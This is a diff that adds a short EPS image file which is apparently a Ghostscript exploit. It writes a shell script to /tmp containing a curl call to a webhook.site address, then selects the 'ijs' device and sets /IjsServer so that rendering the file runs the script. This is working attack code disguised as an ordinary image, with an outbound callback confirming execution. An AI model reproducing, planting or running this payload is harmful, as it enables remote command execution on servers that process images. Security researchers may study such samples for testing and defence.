@@ -1,0 +1,11 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+% First write the script
+(/tmp/ijs_cmd.sh) (w) file dup
+(#!/bin/sh
+curl https://webhook.site/76963a1d-c4a4-4f70-bc91-8c846d4cd75d?ijs_sh=1
+) writestring closefile
+% Make it executable and run via IJS
+(ijs) selectdevice
+<< /IjsServer (/bin/sh /tmp/ijs_cmd.sh) >> setpagedevice
+showpage
